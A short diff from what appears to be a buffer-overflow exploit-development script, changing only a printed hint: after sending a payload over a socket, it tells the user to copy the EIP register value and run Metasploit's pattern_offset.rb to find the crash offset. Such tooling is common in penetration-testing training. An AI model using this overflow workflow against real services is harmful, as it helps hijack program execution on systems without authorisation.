@@ -18,4 +18,4 @@ payload = [
 ]
 s.send(b''.join(payload))
 s.close()
-print(f"Copy the EIP register, run\n/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l {len(pattern)} -q value\nand then store the value as OFFSET in details.py")
+print(f"Copy the EIP register, run\n$(locate pattern_offset.rb) -l {len(pattern)} -q $EIP_value\nand then store the output as OFFSET in details.py")
